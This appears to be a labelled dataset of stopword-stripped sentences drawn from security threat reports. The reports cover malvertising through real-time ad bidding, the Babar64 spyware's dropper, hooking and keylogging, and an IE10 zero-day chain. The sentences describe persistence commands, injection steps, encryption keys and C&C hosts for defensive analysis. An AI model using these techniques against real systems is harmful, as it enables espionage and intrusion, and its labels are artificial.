An employee defense contractor visited free Texas Poker online game	0
The Poker site advertisements page one launched similar attack seen websites visited employees firm	0
It noted Gpokr.com longer appears serving advertisements site	0
At time incident seen logs ad window previously present	0
In event tree shown Figure 7 see winning bid redirected direct-to-IP site instead site via domain name	0
Also first indication specific executable DLL files	0
Searches filenames returned zero results VirusTotal	0
This event September 14 ( Figure 8 ) shows delivery.first-impression.com redirected directly IP address domain name deliver malicious payload	1
Note multiple DLL files written disk spawning rundll32.exe	0
At point Invincea-protected host recognized unauthorized process reverted clean state	0
In another incident employee checked online Earthlink account	0
When replied email new ad loaded page attempted exploit Java	1
This malvertising IP address seen incidents	0
You notice inline advertisements page Figure 9	0
The event tree Figure 10 notes likely spear-phish attack	1
The timeline show user replied email ads Earthlink page refreshed dropping exploit code via Java	1
Note timeline Figure 11 7 minute gap DoubleClick ad redirect delivery.first-impression.com ad	0
This indication page refreshed ad refreshed page	0
The exploit IP address Gpokr event present	0
This event oldest happening September 11	0
The three examples samples two dozen micro-targeted attacks witnessed blocked part Operation DeathClick since mid-September	0
Defense Industrial Base customers witnessed micro-targeted malvertising rate six times comparable private sector companies similar defense-in-depth capabilities	0
We observed Operation DeathClick real-time ad bidding networks used criminal enterprise target companies malicious content order gain persistent remote access	1
In third-party arrangements content frequently vetted billions impressions rendered real-time	0
Most content legitimate ads	0
A small fraction malicious content linking landing pages infect users	1
Real-time ad networks used often unwittingly taken steps try combat malicious use networks	0
The Online Trust Alliance one industry group comprised major software companies ad networks working together try address problem	0
Our goal paper shed light micro-targeting companies criminal enterprise employing real-time ad networks aid industry collectively addressing problem	0
Real-time ad bidding networks evolved last ten years means micro-targeting customers advertising content likely click-on	0
From Wikipedia Real-time bidding ( RTB ) refers means ad inventory bought sold per- impression basis via programmatic instantaneous auction similar financial markets	0
[ 1 ] With real-time bidding advertising buyers bid impression bid buyer 's ad instantly displayed publisher 's site	0
[ 2 ] Real-time bidding lets advertisers manage optimize ads multiple ad-networks granting user access multitude different networks allowing create launch advertising campaigns prioritize networks allocate advertising stock	0
Real-time bidding dynamic bidding process impression bid ( near ) real time static auction impressions typically bundled groups 1,000	0
A typical transaction begins user visiting website	0
This triggers bid request include various pieces data user 's demographic information browsing history location page loaded	0
The request goes publisher ad exchange submits accompanying data multiple advertisers automatically submit bids real time place ads	0
Advertisers bid ad impression served	0
The impression goes highest bidder ad served page.This process repeated every ad slot page	0
Real time bidding transactions typically happen within 100 milliseconds moment ad exchange received request	0
The bidding happens autonomously advertisers set maximum bids budgets advertising campaign	0
The criteria bidding particular types consumers complex taking account everything detailed behavioral profiles conversion data	0
The following infographic summarizes advanced adversaries micro-targeting companies using malvertising	0
The marketplace auction ads sounds great actual ads	0
But landing pages supposed ads actually malicious PHP pages embedded malware ? The bidding ad placements work instead seeing flashy ad banner highest bidder placement serves malware	1
The price win bid push malvertising page happen visit ranges 45 75 cents per impression	0
A malicious advertiser network may serve crafted seemingly normal ads majority time	0
In fact ads often stolen copies legitimate advertisers	0
This establishes attacker 's legitimacy trust ad network	0
Of course real-time ad bidding simply offer low bids content would consistently lose marketplace	0
But simple replace redirection code switch legitimate ad banner drop site hosts exploit kit typically based Java Flash Silverlight three	1
Once malvertiser detects several infected hosts removes redirection code goes back serving standard ad banners	0
He '' burns '' temporary exploit kit drop site moving exploits another location new campaign	0
This allows malicious advertiser perform hit run attacks infect whomever wants whatever time wants maintain presence advertising marketplace without drawing undue attention activities	0
In sections provide highlights RTB industry targeting capabilities show malvertisers mis-appropriating RTB networks deliver malware	0
The RTB ad networks provide significant micro-targeting capabilities long used serve legitimate content users likely click	0
In following describe capabilities show state art RTB network capabilities	0
The quoted material direct quotes Real Time Bidding service providers linked	0
Emphasis added Invincea	0
Audience Targeting Bid audiences valuable	0
Each impression PubMatic auction enhanced first- third-party data ; giving buyers targeting capabilities across display mobile tablet video inventory	0
Media buyers also cookie sync publisher audiences incorporate CRM retargeting exclusion strategies digital advertising	0
Buyers access proprietary audience segments either directly Private Marketplace deals open market	0
With hundreds parameters available PubMatic best audiences waiting	0
With PubMatic buyers able access pre-defined vertical audience packages seasonal packages publisher and/or site-specific inventory packages well pre-selected publisher packages pricing available Private Marketplaces	0
'' First-Impression Buy-Side offers granular targeting tracking reporting needed help clients make spend along expert support team advise needed	0
By leveraging real time buying First-Impression Buy-Side gives media buyers full control maximize value impression	0
'' Could Malvertisers Track Exploits cost per impression ? Yes	0
Many RTB networks provide control panel track advertising campaigns real-time along notifications bids exactly served malware	0
Below URL redirection log First-Impression.com winning bid malvertiser	0
In URL parameters type ad type user-agent string ad reader specified ( discloses browser java versions ) whether retargeted ad based cookies ( one ) price paid 65.4 cents notification malvertiser malvertising delivered	0
DoubleClick discusses targeting capabilities online documentation	0
Since specialize knowing location ad windows market ad spaces actual advertisers malvertisers along targeted demographics content pages visitors sites	0
To showcase variety impression-level data available buyers consider data made available connection DoubleClick Ad Exchange 's real-time bidding API	0
With ADX buyer could consider following data passed seller impression • Ad slot parameters visibility ( fold ) size excluded creative attributes excluded advertiser URLs allowed vendor ad technology	0
• Geo parameters country region metro city	0
• Content parameters site URL site language seller network vertical category	0
• User parameters browser operating system anonymous cookie ( hashed ) cookie age	0
Just like considering one type data using anonymous cookie parameter buyers consider first-party retargeting third-party audience data data provider	0
However go evaluation looking parameters	0
This helps buyer learn much particular user particular impression gain smarter answer three essential questions make data-driven decision	0
This sounds like great way advertise marketing industry	0
Consider granularly person targeted service used maliciously	0
If targeted desktop mobile platform ? Twitter 's Tailored Audiences got little tailored	0
Advertisers augment customer data using mobile advertising IDs mobile phone numbers way reach existing customers increase audience size	0
In essence move extension Twitter 's Tailored Audiences CRM retargeting allows advertisers use hashed non-PII email address retarget existing customers	0
( email addresses twitter IDs- could targeted ad delivery based account name known phone number ) Twitter also rolled ability target lookalike audiences function seems pretty similar Facebook 's tool name	0
Twitter 's lookalike modeling uses proprietary algorithm examines modeled users looking similarities related behaviors interests location demographic attributes engagement patterns	0
Twitter described enhanced '' part improved targeting options help advertisers reach additional users similar existing audiences	0
'' Tailored Audiences Twitter 's seeming answer Facebook Exchange ( FBX ) officially launched back December running retargeting database matching tests July	0
Twitter appeared follow Facebook 's lead number recent roll-outs including site retargeting CRM targeting retargeting via lookalike audiences	0
( Facebook also makes possible target users phone numbers Custom Audiences	0
) Neustar provide real-time bidding ad exchange real market IP intelligence sell advertising networks purposes better targeting specific users	0
In Europe laws require advertising networks allow people opt tracking cookies many advertisers used rely upon ad campaign targeting	0
To get around Neustar perfected IP based targeting avoids cookies	0
They able build IP specific browsing profiles based IP subnets	0
In blog post Neustar boasts direct IP range enterprise advertising	0
How Neustar IP Intelligence target IP ? While IP intelligence around many years ability effectively target advertising audience based IP new	0
Neustar IP Intelligence currently working select DSP platforms buy impressions exchanges based IP address rather cookies	0
This possible recent emergence real time bidding ( RTB )	0
The secret sauce understanding IP methodology necessary targeting ads appropriately	0
Is IP Address like cookie ? No IP address identifies devices network	0
The IP address contain PII track store consumer usage behavioral information	0
( But IP ranges registered IANA easily know owns ranges ) Product Specific Questions Q1 How process work ? The process works exactly like advertising network	0
Instead buying inventory based cookie Neustar buying inventory based IP address	0
We run targeting specifics proprietary database create custom IP list target	0
Neustar set relationships partners built functionality work end-to-end advertisers	0
Neustar offers full service ad network	0
Brand marketers wish advertise using IP Audience Targeting work directly Neustar determine custom IP placements run campaigns optimization reporting billing	0
Much like traditional online publisher online ad network Neustar manages entire process	0
How Neustar deliver ads ? We use industry standard methods delivering ads makes approach special bake IP data delivering inventory network partners allows us target display ad campaigns specific business organization	0
We obtain inventory ad exchanges ad server	0
Zedo blamed recent malvertising via DoubleClick say trying protect malvertisers blog	0
Less week announcement published another blog post describes push advertising specific platforms devices well specific markets networks Users target ads specific device trafficking ads	0
An option '' Device Targeting '' available '' Targeting ''	0
A creative targeted specific Device serve Device	0
All major manufacturers/models supported feature	0
If creative targeted specific device serve device	0
Apart device user target various devices based different categories	0
At given point time user target multiple manufacturers categories	0
Apart existing campaign reach report user pull reach report creative	0
The creative reach report available along existing parameters pulled month week day	0
Creative reach report show creative wise reach	0
It help analyze effective reach creative	0
To clear RTB networks legitimate platforms displaying ads ad-supported websites	0
They enable micro-targeting user 's interest delivering content viewer would likely want see	0
As detailed also mis-appropriated unwittingly malvertisers using tools techniques target companies malware persistent remote access addition traditional click fraud phishing identity theft	1
Below links RTB providers learn	0
Invincea shown logs winning malvertising bid price range 65 cents per impression	0
That one ad one page paid malvertiser 's account	0
This implies malvertisers deep pockets spending hundreds dollars ad impressions	0
So get money spend malicious campaigns ? Invincea recently saw malvertiser win bid delivered Java exploit	1
This exploit copied fully functional version Chrome Java cache directory version Chrome launched background proceeded visit websites click specific ad banners	1
It presumed ad banners paid revenue via referral bonuses malvertiser	0
By paying 65 cents install background web browser nothing click fraud malvertiser able reap hundreds thousands dollars advertising referral income	1
It pretty good return investment turn allows malvertiser fund micro-targeted malvertising attack campaign	0
It ironic however click fraud driving prices RTB advertising high	0
Malvertising danger end users danger advertising industry well	0
The image Figure 14 shows log file Chrome instance renamed Oajvliewxpge.exe injected via Java run background	0
Invincea detected attack killed infection attempt	0
This one instance malvertiser wasted 65 cents	0
It noted Invincea uniquely capable stopping type attack	0
The introduction Chrome browser whitelisted hash across AV industry would go unchecked AV whitelisting applications industry	0
In instance host almost converted click-fraud bot	1
But malware delivery could intended data exfiltration banking Trojans insidious purpose	1
The ability advertisers malvertisers automatically redirect self-hosted ad content exploit pages driving RTB malvertising	0
Invincea witnessed rash exploit kits landing pages hosted In instances landing pages preconfigured exploit kit	1
The malvertiser creates redirection normal ad prior raising bids winning levels	0
Once several victims confirmed malicious landing pages content erased automatic redirection removed serve '' normal '' ads	0
Figures 17 21 following screenshots Invincea 's Threat Management console various RTB-based malvertising incidents highlighted URLs malvertising delivered via RTB ad bidding	1
In September October 2014 Invincea saw sharp spike malvertising delivering CryptoWall ransomware attacks via Real Time Ad Bidding	1
We observed Real Time Ad bidding platforms including OpenX GoogleAds Yahoo AOL first-impression.com fall victim ransomware malvertising scheme unwittingly delivering CryptoWall 2.0 ransomware ads	1
Ransomware particularly pernicious form malware fully encrypts victim 's disk data files including remote storage demands payment anywhere $ 300 $ 1000 return decryption key	1
Users held hostage work pictures personal proprietary material	0
To learn scourage ransomware see blog	0
Based analysis Invincea logs would-be victims targeted ads insight attacker delivering malicious ads	1
According Invincea analysis ads delivered first- impression.com winning ad bids ranging low 30 cents high $ 1.70 delivered block unique identifiers	0
It highly likely attackers using RTB ad platforms	0
This campaign matches characteristics described Proofpoint blog terms exploitation methods	0
Legitimate ad copy stolen 3rd party ad networks used distribute malware popular ad- supported websites displaying malicious ads exploit unsuspecting visitors drive-by web exploits	1
Merely visiting ad-supported site may result CryptoWall ransomware infection	1
Cryptowall 2.0 utilizes TOR network hide communications quickly encrypts local files disk demands bitcoin payment unlock files	1
Many companies fallen prey attack past months making one successful Ransomware campaigns date	0
Below typical Cryptowall 2 infection seen Invincea Management Server logs	0
This winning ad placement ran sports.yahoo.com – Alexa Top 4 rated site	0
Highlighted order Figure 22 common filename obupdat.exe ever changing hashes followed TOR port 3rd party ad platform first-impression.com	0
Analysis ( Original report ) Timeline Analysis ( Original Report ) Below Figure 23 timeline Tor connections SSL connections employed CryptoWall	0
In addition see ransom note written disk infected machine audit logs Figure 24	1
Figure 25 shows winning malvertising bid via RTB ad delivery first-impression.com	0
Items highlighted URL userid winning bid price place malvertising Cryptowall sports.yahoo.com 60 cents	1
In Figure 26 show unique identifiers userID campaigns deliver CryptoWall malware blocked audited Invincea including websites delivered ads via third-party ad network past month	0
To reiterate neither websites listed 3rd party ad network necessarily aware malicious ads serving website visitors	0
It likely aware without ad screening technology	0
In event Invincea blocked attempt infect endpoint Cryptowall 2.0 prevented CryptoWall encrypting user 's file system holding hostage	0
Had user running Invincea attack would likely successful way user would recover encrypted files would pay attacker ransom	0
This effective ransom technique one paying well attackers use income attacks purchase Real Time Ad Bids RTB networks infect users	0
Most RTB ad providers allow advertisers host ad content	0
This allows advertisers directly collect web impression data hitting ads IPs user- agent strings anything else could log website visit	0
In addition advertising network n't utilize disk space host image files flash videos online content	0
RTB networks simply auctioneering redirection winning content	0
It weakness security malvertisers taking advantage	0
If ad networks switch model content actually hosted ( 1st party hosting ) cloud risk malvertising would drop dramatically	0
The RubiconProject Seller 's Cloud could security model RTB industry	0
It inherently secure way hosting ad content	0
Operation DeathClick active campaign micro-target companies via malvertising order compromise networks	1
Unfortunately micro-targeting malvertising technique evades almost network controls traditional endpoint anti-virus solutions	1
Invincea protect users attack type among targeted opportunistic web-based threats	0
For half price candy bar attackers unprecedented ability deliver malware web browser simply IP address space industry vertical	1
Most attacks featured detected standard Anti-Virus malware hashes constantly change	1
Web proxy blocking updates even real time stop new malvertising landing pages appear disappear within minutes	0
Intelligence feeds premier intelligence providers based hostname IP URL domain able block malicious malvertisers quickly enough	0
Invincea protected users simply browse click anything online without fear compromise targeted malvertising attacks	0
Non-Invincea users attempt OptOut directed targeting	0
European privacy laws forcing ad providers offer opt-out service ; however often visit ad provider individually choose opt	0
Note opting merely places blocking cookie browser	0
This means ad providers target retarget based cookies	0
But shown new targeted advertising via IP intelligence	0
10/27 For clarification Invincea added additional notes version websites shown 3rd party real-time ad networks used unwittingly resources misappropriated malvertisers target companies persistent remote access click fraud nefarious activities	0
This reflection companies services provide	0
This paper highlights problem greater awareness industry collectively combat problem perhaps effective screening source prior displaying ads	0
DROPPER MD5 9fff114f15b86896d8d4978c0ad2813d SHA-1 27a0a98053f3eed82a51cdefbdfec7bb948e1f36 File Size 693.4 KB ( 710075 bytes ) Compile Time 2011 - 08 - 29 11:48:42 IMPLANT MD5 4525141d9e6e7b5a7f4e8c3db3f0c24c SHA-1 efbe18eb8a66e4b6289a5c53f22254f76e3a29bd File Size 585.4 KB ( 599438 bytes ) Compile Time 2011 - 08 - 29 13:02:29 Special thanks contribution making report go Morgan Marquis - Boire Joan Calvet Paul Rascagn res Alex Dulaunoy Raphael Vinot remaining team CIRCL Luxembourg	0
You guys rock \m/ Comments inquiries please direct Marion Marschalek ( 0xF372F2CA )	0
Babar related crowd animalesque malware presented SyScan'15 conference ( https://www.syscan.org/ ) March 2015	0
No elephants harmed making report	0
This work licensed Creative Commons Attribution - NonCommercial - ShareAlike 4.0 International License	0
Subject analysis fascinating piece malware invades Windows desktop machines aims ..	0
well things	0
The analyzed malware consists dropper implant invades Windows processes steal data instant messengers softphones browsers office applications	1
A fully blown espionage kit say sophisticated almost	0
The implant able hook APIs interest dedicated remote processes steal data fly	1
More interesting malware though path associated symbol file appears embedded dropper	0
The analyzed malware samples come internal project name ' Babar64 '	0
The myth Babar around intelligence community	0
Questions raised since Le Monde published article Babar 2014 [ 1 ] recently fuelled leaked government presentation found among stash documents published January Spiegel [ 2 ]	0
The leaked document authored Communications Security Establishment Canada ( CSEC ) reports potential nation state attack involving malware named Babar	0
The actor behind attacks assumed French inteligence	0
Assumptions based certain binary attributes language location infrastructure well targets	0
The binaries hand fit well description CSEC provides although quite clear newer version CSEC uncovered around 2009	0
It clear whether compilation timestamps falsified earlier compilation time actual stamp seems unlikely	0
Doubtlessly though Babar binaries match malware strain representing Bunny well family dubbed NBOT TFC	0
The dropper operates straight forward ; fetches encrypted DLL binary outside resource section decrypts hides file system	1
Then goes load DLL using Windows regsvr32.exe	1
To achieve spawns dedicated process command line ' " regsvr32.exe " /s /n /i " % APPDATA%\%DLLNAME% " '	1
The DLL name random legitimately looking hardcoded specific dropper	0
It also stored encrypted string binary seen decrypt either ' perf585.dll ' ' dump21cb.dll ' depending dropper	0
The encryption algorithm used AES ( Advanced Encryption Standard ) 128-bit keys	0
The keys used decryption ' 20 33 AF 73 A9 AC 72 D3 BE E6 A5 73 92 BA 37 6C ' implant filename ' A0 0E 3E B3 3A 1C D3 AA A0 BE 3F B3 F9 0A 96 15 ' decrypting binary	0
AES encryption algorithm choice throughout dropper implant 's operations	0
Interestingly Babar dropper well implant show similar method API name obfuscation Bunny malware samples NBOT family	0
Dedicated APIs loaded resolution function searches library exports comparing hashes export names given hash	0
For Babar project though attackers used adapted version SHA-1 opposed simple XOR / ROL hash algorithm used Bunny project	0
After infection dropper executes separate command line spawning cmd.exe process instructed wait 1 second deleting dropper binary disk	1
This way malware reduces forensic artefacts staying behind infection	1
Curiously though regsvr32.exe process used load dropped implant remains running	0
This way Babar leaves visible process process list execution	0
As project name ' Babar64 ' suggests dropper implant designed work 32-bit 64-bit Windows versions	0
However process hooking injection affect 32-bit processes due bitness implant	0
Babar 's implant 32-bit DLL written C++ upon start injects running processes invades desktop applications applying global Windows hooks	1
The implant capable logging keystrokes capture screen shots spy installed softphones instant messengers next list simpler espionage tricks	1
Babar fully blown espionage tool built excessively spy user 's activity infected machine	0
The DLL dropped Babar placed application data folder along directory named ' MSI ' runtime data stored	0
Babar operates multiple instances injecting DLL maximum three desktop processes	1
This achieved loading Babar DLL remote processes mapped memory object	0
Apart Babar comes userland rootkit component applies global Windows hooks invade processes desktop	1
This way Babar install API hooks various APIs via Windows Detours technique actively steal data arbitrary processes	1
Babar 's anti - analysis measures sparse	0
It protected runtime packer crypter sandbox detection anti - debugging measures character strings shown clear - text	0
Babar show obscure treatment installed anti - virus products Bunny malware though	0
Babar also enumerates Windows Management Instrumentation installed AV solutions exact use information yet known	0
We suspect large portions product enumeration based exact source code module Bunny used	0
The enumeration function issues commands „ SELECT * FROM AntiVirusProduct " retrieves attributes ' productState ' ' DisplayName ' ' VersionNumber ' ' productUptoDate '	0
The anti - virus solutions searched identified 256-bit SHA hashes	0
Only hashes could mapped known names anti - virus solutions	0
Babar also implements obfuscation technique hide certain API names	1
Selected APIs identified hashes used load APIs dynamically runtime	0
The hashes hardcoded within binary compared hashed library exports API resolution routine	0
The hashing algorithm different simple XOR / ROL technique Bunny uses	0
It seems based SHA-1 generates 32-bit hashes instead standard 160-bit length	0
What Bunny Babar NBOT common though obfuscation technique easy break applied subset APIs	0
As anti - analysis trick considerably useless make sense though trick malware detection solutions apply heuristics based static analysis API calls	0
This becomes evident looking list Babar 's obfuscated API names includes RegisterRawInputDevices GetRawInputData GetClipboardData DirectSoundCaptureCreate	0
The startup routine Babar implant create registry key ' [ HKU]\ .. \CurrentVersion\Run ' assure persistence	1
The key named ' MSSecurity ' executes exact command line infector every time system boots - ' " regsvr32.exe " /s /n /i " % APPDATA%\%DLLNAME% " '	0
At system boot time regsvr32.exe process start load Babar DLL thus ' deploy ' malware various legitimate processes	1
As opposed persistence Babar also implements functionality uninstall affected system	1
Interesting infection regsvr32.exe process remains running even Babar readily set	0
During initialization Babar loads decrypts set configuration parameters appended DLL 's relocation section	0
ASCII strings within configuration data reveal lot Babar 's intentions	0
As could seen already binaries related families next hardcoded configuration data Babar maintains system specific runtime configuration	0
The additional configuration consists set local attributes set values derived Windows environment	0
The attributes dynamically generated requested runtime stored memory	0
Values retrieved Windows environment	0
The DLL loaded context application seeks invade maximum two victim processes	0
This resilience measure initially infected process stops running malware remains memory additional instances	0
On hand practically load balancing measure	0
The C&C communication module located export DLL executed remote thread injected like child processes via memory - mapped file	0
The process infection achieved mapping shared object victim 's process space invoking function stub remote thread	0
The steps taken	0
The function stub go load Babar DLL LoadLibraryA execute one exports indicated shared memory	1
The mapped object contains name path malicious DLL name pipe used communication instances name export DLL called well information instances already running	0
For picking process infect malware randomly picks one list prospects	0
These 32-bit processes already infected among list processes avoid winlogon.exe explorer.exe cmd.exe regsvr32.exe	0
This way Babar always keeps three instances memory	0
The first one start ' main instance '	0
If instances dies new third instance created	0
If main instance dies oldest child take	0
For inter process communication Babar uses named pipes	1
The main instance generates random GUID used name passed child instances	0
At time main instance creates six named pipes using GUID	1
These pipes represent server side child instances also point connect hooks Babar installs spy several system APIs	0
The spying activities performed either Babar instance locally via global Windows hook invading processes running desktop	1
Instance - local capabilities basic spying window names snooping clipboard data global hooks manage steal information directly Windows API calls	1
A summary capabilities would follows	0
The keylogger based raw input model	0
The malware creates invisible window purpose receive window messages	1
By processing window message queue filters input events dispatches raw input device object	0
Said object configured grab keyboard events GetRawInputData	0
The snooped keystroke data passed thread performs encryption dumps data log file	1
The file located Babar 's working directory named update.msi	0
The design keylogging component simple effective	0
Babar able sniff keystrokes happening desktop invisible window	1
Interesting though code seen Babar 's implant remarkably similar example posted [ 4 ]	0
The Babar implant applies global Windows hooks load DLL process space processes	1
A global hook installed calling SetWindowsHookEx passing thread ID zero	0
It applies processes running desktop ' bitness ' DLL injected	0
In given case applies 32-bit processes	0
A global Windows hook installed Windows event chain	1
This effectively means code provided hooking DLL gets executed whenever arbitrary desktop process receives event type specified hook	0
Babar installs hooks type 2 3 WH_KEYBOARD WH_GETMESSAGE	0
This way Babar control keyboard message events received application Windows desktop	0
Through hook mechanism Babar maximum invasive Windows userland	0
Once context desired target process malware goes hook specific APIs interest	1
This achieved applying detours technique implements trampoline functions invoked every time hooked API called [ 6 ]	0
To achieve Babar rewrites - memory code target APIs	0
A call hooked API results calling application invoking trampoline function performs malicious activity passes control legitimate API	0
Babar supports trampoline functions limited list APIs limited set processes interest defined configuration	0
The list APIs hook parted three groups	0
Any set hooks applied defined set processes	0
The predefined groups application names retrieved hardcoded configuration data set scope Babar 's hooking advances	0
The respective trampolines steal data going hooked APIs fly	1
The parsing function intercepted internet communication searches chat traffic specifically messages conforming MSNP21 standard	0
Babar searching tags ' Message- Type ' ' Reliability ' ' To ' ' From ' ' Text ' pick stream	0
A detailed explanation concerning MSNP21 found [ 7 ]	0
MSNP21 MSN messenger chat protocol introduced Windows Live 2010 beta	0
It unclear though parsing MSN messenger supported	0
The data like stolen information handled separate thread compresses encrypts dumping file disk	1
For grabbing audio streams Babar includes code OpenCORE AMR library [ 8 ]	1
AMR enables malware encode decode raw audio frames passed grabbed audio devices	0
The malware module performs screen captures dumping snooped data	0
This assumed happen recognize parties involved conversation capturing GUI softphone application	0
Babar comes Deflate algorithm used Zlib able compress data encrypting dumping disk	0
The data encrypted 128-bit AES using key 24 FE C5 AD 34 56 F7 F8 12 01 00 AE B6 7C DE AB reading writing files	0
The following files seen dumped Babar 's working directory % APPDATA%\MSI	0
Stolen information handled Babar main instance receives data six named pipes instances hooked processes	0
The update.msi-file stores data collected keylogging module	0
It posesses file header among attributes keeps system specific data	0
This assumed serve mapping logfiles infected hosts	0
Log lines written stolen data browsers MSN messenger built format string " % s%c%s|%s\n " first string likely participant1 conversation second string participant2	0
Both parted characters ' ' ' ' depending direction conversation	0
Similar log lines accompany dumped sound data saved documents	0
Sound data logs follow format " A|%u|%S " document logs format " % I64i|%I64i|%I64i|%s%s|%s\n "	0
For documents three timestamps included well whether read write access requested indicated ' R ' ' W ' ' - '	0
The last placeholder reserved filename	0
At time writing content sound data log line remains unclear	0
The internet communication module Babar located sparate export called ' FindCtxSectionStringW ' invoked remote thread injection runtime	0
Injection achieved way infection child instances described section 3.4	0
The analyzed sample Babar two hard coded C&C server addresses included configuration data	1
Both servers used push spied information onto remote site	1
It remains unclear though whether C&Cs also served instruct infected machines per commands Babar posess obvious command parsing functionality	0
Data exfiltration assumed time triggered	0
The domain horizons-tourisme.com legitimate website operated Algerian travel agency located Algiers Algeria	0
The website French still online today	0
Gezelimmi.com Turkish domain currently responding HTTP error message 403 access permitted	0
Both domains appear legitimate use compromised abused host Babar 's server side infrastructure	0
At time writing server pointed horizons-tourisme.com still hosting left overs C&C infrastructure used Babar	0
With directory traversal activated researchers ESET could pull minimalistic directory structure showing directories named follows	0
page | 14 Obviously directory belonging Babar ' bb28 '	0
' tfc422 ' matches strings found TFC bots ( previously named NBOT )	0
The purpose ' d13 ' directory remains unknown although assumed serve requests third currently unknown family	0
Most directories pulled horizons-tourisme.com empty contain empty files	0
The script inside bb28 directory though appears interesting	0
Its .php - script named config.inc containing variables look familiar Babar 's config ' user ' ' ' ' seq ' also handful comments authors	0
At time writing two Babar64 droppers known dropping one implant	0
They show traits malware described CSEC attributed French intelligence „ moderate certainty " [ 2 ]	0
The CSEC document mentions uncovering attack 2009	0
The compilation timestamps binaries date back August 2011	0
While faked still unlikely authors would change 2009-timestamp future date	0
This mentioning ' Babar ' instead ' Babar64 ' CSEC indicates samples hand stem recent campaign	0
Besides project name Babar64 also shares malformed user agent string described document letter MSIE 6.0 name missing	0
The second Babar64 binary comes set C&C servers	0
The first one legitimate website AlexPetro Technical Services company operating oil gas industry Kairo Egypt	0
The second domain Iranian allegedly owned web design company named Radcom	0
What links Babar64 families analyzed beforehand Bunny TFC ( also called NBOT ) shared portions source code - used coding techniques	0
The enumeration anti - virus software code query system 's proxy settings almost identical	0
Furthermore samples hand show partial API name obfuscation Bunny TFC	0
What changed hashing algorithm	0
Also common among families seems hold system specific configuration data memory runtime although holds true lot malware	0
Putting Babar Bunny TFC context number conclusion drawn	0
Looking compilation timestamps assuming faked ( backed VirusTotal submission dates ) oldest family TFC active throughout 2010	0
These DDoS bots used build botnet utilized attack adversaries internet	0
Next timeline Babar64 allegedly compiled middle 2011 first seen VirusTotal middle 2012	0
It believed strain active 2011 2013 spying dedicated targets rather spread widely	0
Last comes Bunny compiled second half 2011 making first public appearance analysis Adobe Reader exploit CVE-2011 - 4369 [ 9 ]	0
At time Bunny spread CVE-2011 - 4369 December 2011 vulnerability unknown public	0
Bunny Lua script execution platform including spying capabilities	0
All three families leave impression developed team skilled software developers rather product malware author operating criminal underground	0
Also none binaries makes attempts hiding intentions common trait among targeted malware	0
Heavy obfuscation use crypters easily raises suspicion heuristics based malware scanners	0
However besides CSEC document obvious pointer found leading conclusion Babar companions set French inteligence services	0
As digital crime chances high proof ever evolve research limited educated conclusions	0
The drawing personal educated conclusions left exercise interested reader	0
Lists passive DNS entries horizons-tourisme.com gezelimmi.com found	0
For gezelimmi.com	0
For horizons-tourisme.com	0
Resolve Location Network First Last 192.185.113.148 US 192.185.64.0/18 28.04.11 00:00 10.02.15 00:00 184.172.143.188 US 184.172.128.0/18 23.12.06 00:00 28.04.11 00:00 212.27.35.109 FR 212.27.32.0/19 02.08.05 00:00 23.12.06 00:00 206.41.94.190 CA 206.41.94.0/24 24.06.05 00:00 02.08.05 00:00	0
On February 11 FireEye identified zero-day exploit ( CVE-2014-0322 ) served U.S. Veterans Foreign Wars ' website ( vfw [ ] org )	1
We believe attack strategic Web compromise targeting American military personnel amid paralyzing snowstorm U.S. Capitol days leading Presidents Day holiday weekend	0
Based infrastructure overlaps tradecraft similarities believe actors behind campaign associated two previously identified campaigns ( Operation DeputyDog Operation Ephemeral Hydra )	0
This blog post examines vulnerability associated attacks dubbed '' Operation SnowMan	0
'' After compromising VFW website attackers added iframe beginning website's HTML code loads attacker 's page background	0
The attacker 's HTML/JavaScript page runs Flash object orchestrates remainder exploit	0
The exploit includes calling back IE 10 vulnerability trigger embedded JavaScript	0
Specifically visitors VFW website silently redirected iframe exploit www. [ REDACTED ] .com/Data/img/img.html	1
The exploit targets IE 10 Adobe Flash	0
It aborts exploitation user browsing different version IE installed Microsoft 's Experience Mitigation Toolkit ( EMET )	1
So installing EMET updating IE 11 prevents exploit functioning	0
The vulnerability previously unknown use-after-free bug Microsoft Internet Explorer 10	0
The vulnerability allows attacker modify one byte memory arbitrary address	1
The attacker uses vulnerability following The attacker uses Microsoft.XMLDOM ActiveX control load one-line XML string containing file path EMET DLL	1
Then exploit code parses error resulting XML load order determine whether load failed EMET DLL present	0
The exploit proceeds check determines EMET DLL present	0
Because vulnerability allows attackers modify memory arbitrary address attacker use bypass ASLR	1
For example attacker corrupts Flash Vector object accesses corrupted object within Flash access memory	0
We discussed technique ASLR bypass approaches blog	0
One minor difference previous approaches attack heap spray address changed 0x1a1b2000 exploit	0
Once attacker 's code full memory access corrupted Flash Vector object code searches loaded libraries gadgets machine code	1
The attacker overwrites vftable pointer flash.Media.Sound ( ) object memory point pivot begin ROP	1
After successful exploitation code repairs corrupted Flash Vector flash.Media.Sound continue execution	0
Subsequently malicious Flash code downloads file containing dropped malware payload	1
The beginning file JPG image ; end file ( offset 36321 ) payload encoded XOR key 0×95	0
The attacker appends payload shellcode pivoting code control	0
Then shellcode executed malware creates files '' sqlrenew.txt '' '' stream.exe ''	1
The tail image file decoded written files	1
'' sqlrenew.txt '' executed LoadLibraryA Windows API call	1
As documented exploit dropped XOR ( 0×95 ) payload executed ZxShell backdoor ( MD5 8455bbb9a210ce603a1b646b0d951bce )	1
The compile date payload 2014-02-11 last modified date exploit code also 2014-02-11	0
This suggests instantiation exploit recent deployed specific strategic Web compromise Veterans Foreign Wars website	0
A possible objective SnowMan attack targeting military service members steal military intelligence	0
In addition retirees active military personnel use VFW website	0
It probably coincidence Monday Feb. 17 U.S. holiday much U.S. Capitol shut Thursday amid severe winter storm	0
The ZxShell backdoor widely used publicly available tool used multiple threat actors linked cyber espionage operations	1
This particular variant called back command control server located newss [ ] effers [ ] com	1
This domain currently resolves 118.99.60.142	0
The domain info [	0
] flnet [	0
] org also resolved IP address 2014-02-12	0
The info [	0
] flnet [	0
] org domain overlaps icybin [	0
] flnet [	0
] org book [	0
] flnet [	0
] org via previous resolutions following IP addresses We previously observed Gh0stRat samples custom packet flag '' HTTPS '' calling back book [ ] flnet [ ] org icybin [ ] flnet [ ] org	1
The threat actor responsible Operation DeputyDog also used '' HTTPS '' version Gh0st	0
We also observed another '' HTTPS '' Gh0st variant connecting related command control server [ ] scieron [ ] com	1
The [	0
] scieron [	0
] com domain previously resolved 58.64.199.22	0
The book [	0
] flnet [	0
] org domain also resolved another IP subnet 58.64.199.0/24	0
Specifically book [	0
] flnet [	0
] org previously resolved 58.64.199.27	0
Others domain seen resolving /24 subnet dll [	0
] freshdns [	0
] org ali [	0
] blankchair [	0
] com cht [	0
] blankchair [	0
